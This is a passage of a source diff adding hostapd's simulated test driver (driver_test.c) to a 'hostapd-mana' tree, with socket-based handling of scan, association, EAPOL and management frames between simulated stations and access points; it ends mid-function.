> 	.sta_deauth		= madwifi_sta_deauth,
> 	.hapd_set_ssid		= madwifi_set_ssid,
> 	.hapd_get_ssid		= madwifi_get_ssid,
> 	.hapd_set_countermeasures	= madwifi_set_countermeasures,
> 	.sta_clear_stats        = madwifi_sta_clear_stats,
> 	.commit			= madwifi_commit,
> 	.set_ap_wps_ie		= madwifi_set_ap_wps_ie,
> 	.set_freq		= madwifi_set_freq,
> };
diff '--color=auto' -rN hostapd-2.6/src/drivers/driver_test.c hostapd-mana/src/drivers/driver_test.c
0a1,2683
> /*
>  * Testing driver interface for a simulated network driver
>  * Copyright (c) 2004-2010, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> 
> /* Make sure we get winsock2.h for Windows build to get sockaddr_storage */
> #include "build_config.h"
> #ifdef CONFIG_NATIVE_WINDOWS
> #include <winsock2.h>
> #endif /* CONFIG_NATIVE_WINDOWS */
> 
> #include "utils/includes.h"
> 
> #ifndef CONFIG_NATIVE_WINDOWS
> #include <sys/un.h>
> #include <dirent.h>
> #include <sys/stat.h>
> #define DRIVER_TEST_UNIX
> #endif /* CONFIG_NATIVE_WINDOWS */
> 
> #include "utils/common.h"
> #include "utils/eloop.h"
> #include "utils/list.h"
> #include "utils/trace.h"
> #include "common/ieee802_11_defs.h"
> #include "crypto/sha1.h"
> #include "l2_packet/l2_packet.h"
> #include "wps/wps.h"
> #include "driver.h"
> 
> 
> struct test_client_socket {
> 	struct test_client_socket *next;
> 	u8 addr[ETH_ALEN];
> 	struct sockaddr_un un;
> 	socklen_t unlen;
> 	struct test_driver_bss *bss;
> };
> 
> struct test_driver_bss {
> 	struct wpa_driver_test_data *drv;
> 	struct dl_list list;
> 	void *bss_ctx;
> 	char ifname[IFNAMSIZ];
> 	u8 bssid[ETH_ALEN];
> 	u8 *ie;
> 	size_t ielen;
> 	u8 *wps_beacon_ie;
> 	size_t wps_beacon_ie_len;
> 	u8 *wps_probe_resp_ie;
> 	size_t wps_probe_resp_ie_len;
> 	u8 ssid[32];
> 	size_t ssid_len;
> 	int privacy;
> };
> 
> struct wpa_driver_test_global {
> 	int bss_add_used;
> 	u8 req_addr[ETH_ALEN];
> };
> 
> struct wpa_driver_test_data {
> 	struct wpa_driver_test_global *global;
> 	void *ctx;
> 	WPA_TRACE_REF(ctx);
> 	u8 own_addr[ETH_ALEN];
> 	int test_socket;
> #ifdef DRIVER_TEST_UNIX
> 	struct sockaddr_un hostapd_addr;
> #endif /* DRIVER_TEST_UNIX */
> 	int hostapd_addr_set;
> 	struct sockaddr_in hostapd_addr_udp;
> 	int hostapd_addr_udp_set;
> 	char *own_socket_path;
> 	char *test_dir;
> #define MAX_SCAN_RESULTS 30
> 	struct wpa_scan_res *scanres[MAX_SCAN_RESULTS];
> 	size_t num_scanres;
> 	int use_associnfo;
> 	u8 assoc_wpa_ie[80];
> 	size_t assoc_wpa_ie_len;
> 	int associated;
> 	u8 *probe_req_ie;
> 	size_t probe_req_ie_len;
> 	u8 probe_req_ssid[32];
> 	size_t probe_req_ssid_len;
> 	int ibss;
> 	int ap;
> 
> 	struct test_client_socket *cli;
> 	struct dl_list bss;
> 	int udp_port;
> 
> 	int alloc_iface_idx;
> 
> 	int probe_req_report;
> 	unsigned int remain_on_channel_freq;
> 	unsigned int remain_on_channel_duration;
> 
> 	int current_freq;
> };
> 
> 
> static void wpa_driver_test_deinit(void *priv);
> static int wpa_driver_test_attach(struct wpa_driver_test_data *drv,
> 				  const char *dir, int ap);
> static void wpa_driver_test_close_test_socket(
> 	struct wpa_driver_test_data *drv);
> static void test_remain_on_channel_timeout(void *eloop_ctx, void *timeout_ctx);
> 
> 
> static void test_driver_free_bss(struct test_driver_bss *bss)
> {
> 	os_free(bss->ie);
> 	os_free(bss->wps_beacon_ie);
> 	os_free(bss->wps_probe_resp_ie);
> 	os_free(bss);
> }
> 
> 
> static void test_driver_free_bsses(struct wpa_driver_test_data *drv)
> {
> 	struct test_driver_bss *bss, *tmp;
> 
> 	dl_list_for_each_safe(bss, tmp, &drv->bss, struct test_driver_bss,
> 			      list) {
> 		dl_list_del(&bss->list);
> 		test_driver_free_bss(bss);
> 	}
> }
> 
> 
> static struct test_client_socket *
> test_driver_get_cli(struct wpa_driver_test_data *drv, struct sockaddr_un *from,
> 		    socklen_t fromlen)
> {
> 	struct test_client_socket *cli = drv->cli;
> 
> 	while (cli) {
> 		if (cli->unlen == fromlen &&
> 		    strncmp(cli->un.sun_path, from->sun_path,
> 			    fromlen - sizeof(cli->un.sun_family)) == 0)
> 			return cli;
> 		cli = cli->next;
> 	}
> 
> 	return NULL;
> }
> 
> 
> static int test_driver_send_eapol(void *priv, const u8 *addr, const u8 *data,
> 				  size_t data_len, int encrypt,
> 				  const u8 *own_addr, u32 flags)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct test_client_socket *cli;
> 	struct msghdr msg;
> 	struct iovec io[3];
> 	struct l2_ethhdr eth;
> 
> 	if (drv->test_socket < 0)
> 		return -1;
> 
> 	cli = drv->cli;
> 	while (cli) {
> 		if (memcmp(cli->addr, addr, ETH_ALEN) == 0)
> 			break;
> 		cli = cli->next;
> 	}
> 
> 	if (!cli) {
> 		wpa_printf(MSG_DEBUG, "%s: no destination client entry",
> 			   __func__);
> 		return -1;
> 	}
> 
> 	memcpy(eth.h_dest, addr, ETH_ALEN);
> 	memcpy(eth.h_source, own_addr, ETH_ALEN);
> 	eth.h_proto = host_to_be16(ETH_P_EAPOL);
> 
> 	io[0].iov_base = "EAPOL ";
> 	io[0].iov_len = 6;
> 	io[1].iov_base = &eth;
> 	io[1].iov_len = sizeof(eth);
> 	io[2].iov_base = (u8 *) data;
> 	io[2].iov_len = data_len;
> 
> 	memset(&msg, 0, sizeof(msg));
> 	msg.msg_iov = io;
> 	msg.msg_iovlen = 3;
> 	msg.msg_name = &cli->un;
> 	msg.msg_namelen = cli->unlen;
> 	return sendmsg(drv->test_socket, &msg, 0);
> }
> 
> 
> static int test_driver_send_ether(void *priv, const u8 *dst, const u8 *src,
> 				  u16 proto, const u8 *data, size_t data_len)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct msghdr msg;
> 	struct iovec io[3];
> 	struct l2_ethhdr eth;
> 	char desttxt[30];
> 	struct sockaddr_un addr;
> 	struct dirent *dent;
> 	DIR *dir;
> 	int ret = 0, broadcast = 0, count = 0;
> 
> 	if (drv->test_socket < 0 || drv->test_dir == NULL) {
> 		wpa_printf(MSG_DEBUG, "%s: invalid parameters (sock=%d "
> 			   "test_dir=%p)",
> 			   __func__, drv->test_socket, drv->test_dir);
> 		return -1;
> 	}
> 
> 	broadcast = memcmp(dst, "\xff\xff\xff\xff\xff\xff", ETH_ALEN) == 0;
> 	snprintf(desttxt, sizeof(desttxt), MACSTR, MAC2STR(dst));
> 
> 	memcpy(eth.h_dest, dst, ETH_ALEN);
> 	memcpy(eth.h_source, src, ETH_ALEN);
> 	eth.h_proto = host_to_be16(proto);
> 
> 	io[0].iov_base = "ETHER ";
> 	io[0].iov_len = 6;
> 	io[1].iov_base = &eth;
> 	io[1].iov_len = sizeof(eth);
> 	io[2].iov_base = (u8 *) data;
> 	io[2].iov_len = data_len;
> 
> 	memset(&msg, 0, sizeof(msg));
> 	msg.msg_iov = io;
> 	msg.msg_iovlen = 3;
> 
> 	dir = opendir(drv->test_dir);
> 	if (dir == NULL) {
> 		perror("test_driver: opendir");
> 		return -1;
> 	}
> 	while ((dent = readdir(dir))) {
> #ifdef _DIRENT_HAVE_D_TYPE
> 		/* Skip the file if it is not a socket. Also accept
> 		 * DT_UNKNOWN (0) in case the C library or underlying file
> 		 * system does not support d_type. */
> 		if (dent->d_type != DT_SOCK && dent->d_type != DT_UNKNOWN)
> 			continue;
> #endif /* _DIRENT_HAVE_D_TYPE */
> 		if (strcmp(dent->d_name, ".") == 0 ||
> 		    strcmp(dent->d_name, "..") == 0)
> 			continue;
> 
> 		memset(&addr, 0, sizeof(addr));
> 		addr.sun_family = AF_UNIX;
> 		snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/%s",
> 			 drv->test_dir, dent->d_name);
> 
> 		if (strcmp(addr.sun_path, drv->own_socket_path) == 0)
> 			continue;
> 		if (!broadcast && strstr(dent->d_name, desttxt) == NULL)
> 			continue;
> 
> 		wpa_printf(MSG_DEBUG, "%s: Send ether frame to %s",
> 			   __func__, dent->d_name);
> 
> 		msg.msg_name = &addr;
> 		msg.msg_namelen = sizeof(addr);
> 		ret = sendmsg(drv->test_socket, &msg, 0);
> 		if (ret < 0)
> 			perror("driver_test: sendmsg");
> 		count++;
> 	}
> 	closedir(dir);
> 
> 	if (!broadcast && count == 0) {
> 		wpa_printf(MSG_DEBUG, "%s: Destination " MACSTR " not found",
> 			   __func__, MAC2STR(dst));
> 		return -1;
> 	}
> 
> 	return ret;
> }
> 
> 
> static int wpa_driver_test_send_mlme(void *priv, const u8 *data,
> 				     size_t data_len, int noack)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct msghdr msg;
> 	struct iovec io[2];
> 	const u8 *dest;
> 	struct sockaddr_un addr;
> 	struct dirent *dent;
> 	DIR *dir;
> 	int broadcast;
> 	int ret = 0;
> 	struct ieee80211_hdr *hdr;
> 	u16 fc;
> 	char cmd[50];
> 	int freq;
> #ifdef HOSTAPD
> 	char desttxt[30];
> #endif /* HOSTAPD */
> 	union wpa_event_data event;
> 
> 	wpa_hexdump(MSG_MSGDUMP, "test_send_mlme", data, data_len);
> 	if (drv->test_socket < 0 || data_len < 10) {
> 		wpa_printf(MSG_DEBUG, "%s: invalid parameters (sock=%d len=%lu"
> 			   " test_dir=%p)",
> 			   __func__, drv->test_socket,
> 			   (unsigned long) data_len,
> 			   drv->test_dir);
> 		return -1;
> 	}
> 
> 	dest = data + 4;
> 	broadcast = os_memcmp(dest, "\xff\xff\xff\xff\xff\xff", ETH_ALEN) == 0;
> 
> #ifdef HOSTAPD
> 	snprintf(desttxt, sizeof(desttxt), MACSTR, MAC2STR(dest));
> #endif /* HOSTAPD */
> 
> 	if (drv->remain_on_channel_freq)
> 		freq = drv->remain_on_channel_freq;
> 	else
> 		freq = drv->current_freq;
> 	wpa_printf(MSG_DEBUG, "test_driver(%s): MLME TX on freq %d MHz",
> 		   dbss->ifname, freq);
> 	os_snprintf(cmd, sizeof(cmd), "MLME freq=%d ", freq);
> 	io[0].iov_base = cmd;
> 	io[0].iov_len = os_strlen(cmd);
> 	io[1].iov_base = (void *) data;
> 	io[1].iov_len = data_len;
> 
> 	os_memset(&msg, 0, sizeof(msg));
> 	msg.msg_iov = io;
> 	msg.msg_iovlen = 2;
> 
> #ifdef HOSTAPD
> 	if (drv->test_dir == NULL) {
> 		wpa_printf(MSG_DEBUG, "%s: test_dir == NULL", __func__);
> 		return -1;
> 	}
> 
> 	dir = opendir(drv->test_dir);
> 	if (dir == NULL) {
> 		perror("test_driver: opendir");
> 		return -1;
> 	}
> 	while ((dent = readdir(dir))) {
> #ifdef _DIRENT_HAVE_D_TYPE
> 		/* Skip the file if it is not a socket. Also accept
> 		 * DT_UNKNOWN (0) in case the C library or underlying file
> 		 * system does not support d_type. */
> 		if (dent->d_type != DT_SOCK && dent->d_type != DT_UNKNOWN)
> 			continue;
> #endif /* _DIRENT_HAVE_D_TYPE */
> 		if (os_strcmp(dent->d_name, ".") == 0 ||
> 		    os_strcmp(dent->d_name, "..") == 0)
> 			continue;
> 
> 		os_memset(&addr, 0, sizeof(addr));
> 		addr.sun_family = AF_UNIX;
> 		os_snprintf(addr.sun_path, sizeof(addr.sun_path), "%s/%s",
> 			    drv->test_dir, dent->d_name);
> 
> 		if (os_strcmp(addr.sun_path, drv->own_socket_path) == 0)
> 			continue;
> 		if (!broadcast && os_strstr(dent->d_name, desttxt) == NULL)
> 			continue;
> 
> 		wpa_printf(MSG_DEBUG, "%s: Send management frame to %s",
> 			   __func__, dent->d_name);
> 
> 		msg.msg_name = &addr;
> 		msg.msg_namelen = sizeof(addr);
> 		ret = sendmsg(drv->test_socket, &msg, 0);
> 		if (ret < 0)
> 			perror("driver_test: sendmsg(test_socket)");
> 	}
> 	closedir(dir);
> #else /* HOSTAPD */
> 
> 	if (os_memcmp(dest, dbss->bssid, ETH_ALEN) == 0 ||
> 	    drv->test_dir == NULL) {
> 		if (drv->hostapd_addr_udp_set) {
> 			msg.msg_name = &drv->hostapd_addr_udp;
> 			msg.msg_namelen = sizeof(drv->hostapd_addr_udp);
> 		} else {
> #ifdef DRIVER_TEST_UNIX
> 			msg.msg_name = &drv->hostapd_addr;
> 			msg.msg_namelen = sizeof(drv->hostapd_addr);
> #endif /* DRIVER_TEST_UNIX */
> 		}
> 	} else if (broadcast) {
> 		dir = opendir(drv->test_dir);
> 		if (dir == NULL)
> 			return -1;
> 		while ((dent = readdir(dir))) {
> #ifdef _DIRENT_HAVE_D_TYPE
> 			/* Skip the file if it is not a socket.
> 			 * Also accept DT_UNKNOWN (0) in case
> 			 * the C library or underlying file
> 			 * system does not support d_type. */
> 			if (dent->d_type != DT_SOCK &&
> 			    dent->d_type != DT_UNKNOWN)
> 				continue;
> #endif /* _DIRENT_HAVE_D_TYPE */
> 			if (os_strcmp(dent->d_name, ".") == 0 ||
> 			    os_strcmp(dent->d_name, "..") == 0)
> 				continue;
> 			wpa_printf(MSG_DEBUG, "%s: Send broadcast MLME to %s",
> 				   __func__, dent->d_name);
> 			os_memset(&addr, 0, sizeof(addr));
> 			addr.sun_family = AF_UNIX;
> 			os_snprintf(addr.sun_path, sizeof(addr.sun_path),
> 				    "%s/%s", drv->test_dir, dent->d_name);
> 
> 			msg.msg_name = &addr;
> 			msg.msg_namelen = sizeof(addr);
> 
> 			ret = sendmsg(drv->test_socket, &msg, 0);
> 			if (ret < 0)
> 				perror("driver_test: sendmsg(test_socket)");
> 		}
> 		closedir(dir);
> 		return ret;
> 	} else {
> 		struct stat st;
> 		os_memset(&addr, 0, sizeof(addr));
> 		addr.sun_family = AF_UNIX;
> 		os_snprintf(addr.sun_path, sizeof(addr.sun_path),
> 			    "%s/AP-" MACSTR, drv->test_dir, MAC2STR(dest));
> 		if (stat(addr.sun_path, &st) < 0) {
> 			os_snprintf(addr.sun_path, sizeof(addr.sun_path),
> 				    "%s/STA-" MACSTR,
> 				    drv->test_dir, MAC2STR(dest));
> 		}
> 		msg.msg_name = &addr;
> 		msg.msg_namelen = sizeof(addr);
> 	}
> 
> 	if (sendmsg(drv->test_socket, &msg, 0) < 0) {
> 		perror("sendmsg(test_socket)");
> 		return -1;
> 	}
> #endif /* HOSTAPD */
> 
> 	hdr = (struct ieee80211_hdr *) data;
> 	fc = le_to_host16(hdr->frame_control);
> 
> 	os_memset(&event, 0, sizeof(event));
> 	event.tx_status.type = WLAN_FC_GET_TYPE(fc);
> 	event.tx_status.stype = WLAN_FC_GET_STYPE(fc);
> 	event.tx_status.dst = hdr->addr1;
> 	event.tx_status.data = data;
> 	event.tx_status.data_len = data_len;
> 	event.tx_status.ack = ret >= 0;
> 	wpa_supplicant_event(drv->ctx, EVENT_TX_STATUS, &event);
> 
> 	return ret;
> }
> 
> 
> static void test_driver_scan(struct wpa_driver_test_data *drv,
> 			     struct sockaddr_un *from, socklen_t fromlen,
> 			     char *data)
> {
> 	char buf[512], *pos, *end;
> 	int ret;
> 	struct test_driver_bss *bss;
> 	u8 sa[ETH_ALEN];
> 	u8 ie[512];
> 	size_t ielen;
> 	union wpa_event_data event;
> 
> 	/* data: optional [ ' ' | STA-addr | ' ' | IEs(hex) ] */
> 
> 	wpa_printf(MSG_DEBUG, "test_driver: SCAN");
> 
> 	if (*data) {
> 		if (*data != ' ' ||
> 		    hwaddr_aton(data + 1, sa)) {
> 			wpa_printf(MSG_DEBUG, "test_driver: Unexpected SCAN "
> 				   "command format");
> 			return;
> 		}
> 
> 		data += 18;
> 		while (*data == ' ')
> 			data++;
> 		ielen = os_strlen(data) / 2;
> 		if (ielen > sizeof(ie))
> 			ielen = sizeof(ie);
> 		if (hexstr2bin(data, ie, ielen) < 0)
> 			ielen = 0;
> 
> 		wpa_printf(MSG_DEBUG, "test_driver: Scan from " MACSTR,
> 			   MAC2STR(sa));
> 		wpa_hexdump(MSG_MSGDUMP, "test_driver: scan IEs", ie, ielen);
> 
> 		os_memset(&event, 0, sizeof(event));
> 		event.rx_probe_req.sa = sa;
> 		event.rx_probe_req.ie = ie;
> 		event.rx_probe_req.ie_len = ielen;
> 		wpa_supplicant_event(drv->ctx, EVENT_RX_PROBE_REQ, &event);
> 	}
> 
> 	dl_list_for_each(bss, &drv->bss, struct test_driver_bss, list) {
> 		pos = buf;
> 		end = buf + sizeof(buf);
> 
> 		/* reply: SCANRESP BSSID SSID IEs */
> 		ret = snprintf(pos, end - pos, "SCANRESP " MACSTR " ",
> 			       MAC2STR(bss->bssid));
> 		if (ret < 0 || ret >= end - pos)
> 			return;
> 		pos += ret;
> 		pos += wpa_snprintf_hex(pos, end - pos,
> 					bss->ssid, bss->ssid_len);
> 		ret = snprintf(pos, end - pos, " ");
> 		if (ret < 0 || ret >= end - pos)
> 			return;
> 		pos += ret;
> 		pos += wpa_snprintf_hex(pos, end - pos, bss->ie, bss->ielen);
> 		pos += wpa_snprintf_hex(pos, end - pos, bss->wps_probe_resp_ie,
> 					bss->wps_probe_resp_ie_len);
> 
> 		if (bss->privacy) {
> 			ret = snprintf(pos, end - pos, " PRIVACY");
> 			if (ret < 0 || ret >= end - pos)
> 				return;
> 			pos += ret;
> 		}
> 
> 		sendto(drv->test_socket, buf, pos - buf, 0,
> 		       (struct sockaddr *) from, fromlen);
> 	}
> }
> 
> 
> static void test_driver_assoc(struct wpa_driver_test_data *drv,
> 			      struct sockaddr_un *from, socklen_t fromlen,
> 			      char *data)
> {
> 	struct test_client_socket *cli;
> 	u8 ie[256], ssid[32];
> 	size_t ielen, ssid_len = 0;
> 	char *pos, *pos2, cmd[50];
> 	struct test_driver_bss *bss, *tmp;
> 
> 	/* data: STA-addr SSID(hex) IEs(hex) */
> 
> 	cli = os_zalloc(sizeof(*cli));
> 	if (cli == NULL)
> 		return;
> 
> 	if (hwaddr_aton(data, cli->addr)) {
> 		printf("test_socket: Invalid MAC address '%s' in ASSOC\n",
> 		       data);
> 		os_free(cli);
> 		return;
> 	}
> 	pos = data + 17;
> 	while (*pos == ' ')
> 		pos++;
> 	pos2 = strchr(pos, ' ');
> 	ielen = 0;
> 	if (pos2) {
> 		ssid_len = (pos2 - pos) / 2;
> 		if (hexstr2bin(pos, ssid, ssid_len) < 0) {
> 			wpa_printf(MSG_DEBUG, "%s: Invalid SSID", __func__);
> 			os_free(cli);
> 			return;
> 		}
> 		wpa_hexdump_ascii(MSG_DEBUG, "test_driver_assoc: SSID",
> 				  ssid, ssid_len);
> 
> 		pos = pos2 + 1;
> 		ielen = strlen(pos) / 2;
> 		if (ielen > sizeof(ie))
> 			ielen = sizeof(ie);
> 		if (hexstr2bin(pos, ie, ielen) < 0)
> 			ielen = 0;
> 	}
> 
> 	bss = NULL;
> 	dl_list_for_each(tmp, &drv->bss, struct test_driver_bss, list) {
> 		if (tmp->ssid_len == ssid_len &&
> 		    os_memcmp(tmp->ssid, ssid, ssid_len) == 0) {
> 			bss = tmp;
> 			break;
> 		}
> 	}
> 	if (bss == NULL) {
> 		wpa_printf(MSG_DEBUG, "%s: No matching SSID found from "
> 			   "configured BSSes", __func__);
> 		os_free(cli);
> 		return;
> 	}
> 
> 	cli->bss = bss;
> 	memcpy(&cli->un, from, sizeof(cli->un));
> 	cli->unlen = fromlen;
> 	cli->next = drv->cli;
> 	drv->cli = cli;
> 	wpa_hexdump_ascii(MSG_DEBUG, "test_socket: ASSOC sun_path",
> 			  (const u8 *) cli->un.sun_path,
> 			  cli->unlen - sizeof(cli->un.sun_family));
> 
> 	snprintf(cmd, sizeof(cmd), "ASSOCRESP " MACSTR " 0",
> 		 MAC2STR(bss->bssid));
> 	sendto(drv->test_socket, cmd, strlen(cmd), 0,
> 	       (struct sockaddr *) from, fromlen);
> 
> 	drv_event_assoc(bss->bss_ctx, cli->addr, ie, ielen, 0);
> }
> 
> 
> static void test_driver_disassoc(struct wpa_driver_test_data *drv,
> 				 struct sockaddr_un *from, socklen_t fromlen)
> {
> 	struct test_client_socket *cli;
> 
> 	cli = test_driver_get_cli(drv, from, fromlen);
> 	if (!cli)
> 		return;
> 
> 	drv_event_disassoc(drv->ctx, cli->addr);
> }
> 
> 
> static void test_driver_eapol(struct wpa_driver_test_data *drv,
> 			      struct sockaddr_un *from, socklen_t fromlen,
> 			      u8 *data, size_t datalen)
> {
> #ifdef HOSTAPD
> 	struct test_client_socket *cli;
> #endif /* HOSTAPD */
> 	const u8 *src = NULL;
> 
> 	if (datalen > 14) {
> 		/* Skip Ethernet header */
> 		src = data + ETH_ALEN;
> 		wpa_printf(MSG_DEBUG, "test_driver: dst=" MACSTR " src="
> 			   MACSTR " proto=%04x",
> 			   MAC2STR(data), MAC2STR(src),
> 			   WPA_GET_BE16(data + 2 * ETH_ALEN));
> 		data += 14;
> 		datalen -= 14;
> 	}
> 
> #ifdef HOSTAPD
> 	cli = test_driver_get_cli(drv, from, fromlen);
> 	if (cli) {
> 		drv_event_eapol_rx(cli->bss->bss_ctx, cli->addr, data,
> 				   datalen);
> 	} else {
> 		wpa_printf(MSG_DEBUG, "test_socket: EAPOL from unknown "
> 			   "client");
> 	}
> #else /* HOSTAPD */
> 	if (src)
> 		drv_event_eapol_rx(drv->ctx, src, data, datalen);
> #endif /* HOSTAPD */
> }
> 
> 
> static void test_driver_ether(struct wpa_driver_test_data *drv,
> 			      struct sockaddr_un *from, socklen_t fromlen,
> 			      u8 *data, size_t datalen)
> {
> 	struct l2_ethhdr *eth;
> 
> 	if (datalen < sizeof(*eth))
> 		return;
> 
> 	eth = (struct l2_ethhdr *) data;
> 	wpa_printf(MSG_DEBUG, "test_driver: RX ETHER dst=" MACSTR " src="
> 		   MACSTR " proto=%04x",
> 		   MAC2STR(eth->h_dest), MAC2STR(eth->h_source),
> 		   be_to_host16(eth->h_proto));
> 
> #ifdef CONFIG_IEEE80211R
> 	if (be_to_host16(eth->h_proto) == ETH_P_RRB) {
> 		union wpa_event_data ev;
> 		os_memset(&ev, 0, sizeof(ev));
> 		ev.ft_rrb_rx.src = eth->h_source;
> 		ev.ft_rrb_rx.data = data + sizeof(*eth);
> 		ev.ft_rrb_rx.data_len = datalen - sizeof(*eth);
> 	}
> #endif /* CONFIG_IEEE80211R */
> }
> 
> 
> static void test_driver_mlme(struct wpa_driver_test_data *drv,
> 			     struct sockaddr_un *from, socklen_t fromlen,
> 			     u8 *data, size_t datalen)
> {
> 	struct ieee80211_hdr *hdr;
> 	u16 fc;
> 	union wpa_event_data event;
> 	int freq = 0, own_freq;
> 	struct test_driver_bss *bss;
> 
> 	bss = dl_list_first(&drv->bss, struct test_driver_bss, list);
> 
> 	if (datalen > 6 && os_memcmp(data, "freq=", 5) == 0) {
> 		size_t pos;
> 		for (pos = 5; pos < datalen; pos++) {
> 			if (data[pos] == ' ')
> 				break;
> 		}
> 		if (pos < datalen) {
> 			freq = atoi((const char *) &data[5]);
> 			wpa_printf(MSG_DEBUG, "test_driver(%s): MLME RX on "
> 				   "freq %d MHz", bss->ifname, freq);
> 			pos++;
> 			data += pos;
> 			datalen -= pos;
> 		}
> 	}
> 
> 	if (drv->remain_on_channel_freq)
> 		own_freq = drv->remain_on_channel_freq;
> 	else
> 		own_freq = drv->current_freq;
> 
> 	if (freq && own_freq && freq != own_freq) {
> 		wpa_printf(MSG_DEBUG, "test_driver(%s): Ignore MLME RX on "
> 			   "another frequency %d MHz (own %d MHz)",
> 			   bss->ifname, freq, own_freq);
> 		return;
> 	}
> 
> 	hdr = (struct ieee80211_hdr *) data;
> 
> 	if (test_driver_get_cli(drv, from, fromlen) == NULL && datalen >= 16) {
> 		struct test_client_socket *cli;
> 		cli = os_zalloc(sizeof(*cli));
> 		if (cli == NULL)
> 			return;
> 		wpa_printf(MSG_DEBUG, "Adding client entry for " MACSTR,
> 			   MAC2STR(hdr->addr2));
> 		memcpy(cli->addr, hdr->addr2, ETH_ALEN);
> 		memcpy(&cli->un, from, sizeof(cli->un));
> 		cli->unlen = fromlen;
> 		cli->next = drv->cli;
> 		drv->cli = cli;
> 	}
> 
> 	wpa_hexdump(MSG_MSGDUMP, "test_driver_mlme: received frame",
> 		    data, datalen);
> 	fc = le_to_host16(hdr->frame_control);
> 	if (WLAN_FC_GET_TYPE(fc) != WLAN_FC_TYPE_MGMT) {
> 		wpa_printf(MSG_ERROR, "%s: received non-mgmt frame",
> 			   __func__);
> 		return;
> 	}
> 
> 	os_memset(&event, 0, sizeof(event));
> 	event.rx_mgmt.frame = data;
> 	event.rx_mgmt.frame_len = datalen;
> 	wpa_supplicant_event(drv->ctx, EVENT_RX_MGMT, &event);
> }
> 
> 
> static void test_driver_receive_unix(int sock, void *eloop_ctx, void *sock_ctx)
> {
> 	struct wpa_driver_test_data *drv = eloop_ctx;
> 	char buf[2000];
> 	int res;
> 	struct sockaddr_un from;
> 	socklen_t fromlen = sizeof(from);
> 
> 	res = recvfrom(sock, buf, sizeof(buf) - 1, 0,
> 		       (struct sockaddr *) &from, &fromlen);
> 	if (res < 0) {
> 		perror("recvfrom(test_socket)");
> 		return;
> 	}
> 	buf[res] = '\0';
> 
> 	wpa_printf(MSG_DEBUG, "test_driver: received %u bytes", res);
> 
> 	if (strncmp(buf, "SCAN", 4) == 0) {
> 		test_driver_scan(drv, &from, fromlen, buf + 4);
> 	} else if (strncmp(buf, "ASSOC ", 6) == 0) {
> 		test_driver_assoc(drv, &from, fromlen, buf + 6);
> 	} else if (strcmp(buf, "DISASSOC") == 0) {
> 		test_driver_disassoc(drv, &from, fromlen);
> 	} else if (strncmp(buf, "EAPOL ", 6) == 0) {
> 		test_driver_eapol(drv, &from, fromlen, (u8 *) buf + 6,
> 				  res - 6);
> 	} else if (strncmp(buf, "ETHER ", 6) == 0) {
> 		test_driver_ether(drv, &from, fromlen, (u8 *) buf + 6,
> 				  res - 6);
> 	} else if (strncmp(buf, "MLME ", 5) == 0) {
> 		test_driver_mlme(drv, &from, fromlen, (u8 *) buf + 5, res - 5);
> 	} else {
> 		wpa_hexdump_ascii(MSG_DEBUG, "Unknown test_socket command",
> 				  (u8 *) buf, res);
> 	}
> }
> 
> 
> static int test_driver_set_generic_elem(void *priv,
> 					const u8 *elem, size_t elem_len)
> {
> 	struct test_driver_bss *bss = priv;
> 
> 	os_free(bss->ie);
> 
> 	if (elem == NULL) {
> 		bss->ie = NULL;
> 		bss->ielen = 0;
> 		return 0;
> 	}
> 
> 	bss->ie = os_malloc(elem_len);
> 	if (bss->ie == NULL) {
> 		bss->ielen = 0;
> 		return -1;
> 	}
> 
> 	memcpy(bss->ie, elem, elem_len);
> 	bss->ielen = elem_len;
> 	return 0;
> }
> 
> 
> static int test_driver_set_ap_wps_ie(void *priv, const struct wpabuf *beacon,
> 				     const struct wpabuf *proberesp,
> 				     const struct wpabuf *assocresp)
> {
> 	struct test_driver_bss *bss = priv;
> 
> 	if (beacon == NULL)
> 		wpa_printf(MSG_DEBUG, "test_driver: Clear Beacon WPS IE");
> 	else
> 		wpa_hexdump_buf(MSG_DEBUG, "test_driver: Beacon WPS IE",
> 				beacon);
> 
> 	os_free(bss->wps_beacon_ie);
> 
> 	if (beacon == NULL) {
> 		bss->wps_beacon_ie = NULL;
> 		bss->wps_beacon_ie_len = 0;
> 	} else {
> 		bss->wps_beacon_ie = os_malloc(wpabuf_len(beacon));
> 		if (bss->wps_beacon_ie == NULL) {
> 			bss->wps_beacon_ie_len = 0;
> 			return -1;
> 		}
> 
> 		os_memcpy(bss->wps_beacon_ie, wpabuf_head(beacon),
> 			  wpabuf_len(beacon));
> 		bss->wps_beacon_ie_len = wpabuf_len(beacon);
> 	}
> 
> 	if (proberesp == NULL)
> 		wpa_printf(MSG_DEBUG, "test_driver: Clear Probe Response WPS "
> 			   "IE");
> 	else
> 		wpa_hexdump_buf(MSG_DEBUG, "test_driver: Probe Response WPS "
> 				"IE", proberesp);
> 
> 	os_free(bss->wps_probe_resp_ie);
> 
> 	if (proberesp == NULL) {
> 		bss->wps_probe_resp_ie = NULL;
> 		bss->wps_probe_resp_ie_len = 0;
> 	} else {
> 		bss->wps_probe_resp_ie = os_malloc(wpabuf_len(proberesp));
> 		if (bss->wps_probe_resp_ie == NULL) {
> 			bss->wps_probe_resp_ie_len = 0;
> 			return -1;
> 		}
> 
> 		os_memcpy(bss->wps_probe_resp_ie, wpabuf_head(proberesp),
> 			  wpabuf_len(proberesp));
> 		bss->wps_probe_resp_ie_len = wpabuf_len(proberesp);
> 	}
> 
> 	return 0;
> }
> 
> 
> static int test_driver_sta_deauth(void *priv, const u8 *own_addr,
> 				  const u8 *addr, int reason)
> {
> 	struct test_driver_bss *dbss = priv;
> 	struct wpa_driver_test_data *drv = dbss->drv;
> 	struct test_client_socket *cli;
> 
> 	if (drv->test_socket < 0)
> 		return -1;
> 
> 	cli = drv->cli;
> 	while (cli) {
> 		if (memcmp(cli->addr, addr, ETH_ALEN) == 0)
> 			break;
> 		cli = cli->next;
> 	}
> 
> 	if (!cli)
> 		return -1;
> 
> 	return sendto(drv->test_socket, "DEAUTH", 6, 0,
> 		      (struct sockaddr *) &cli->un, cli->unlen);
> }
> 
> 
> static int test_driver_sta_disassoc(void *priv, const u8 *own_addr,
> 				    const u8 *addr, int reason)
> {
> 	struct test_driver_bss *dbss = priv;
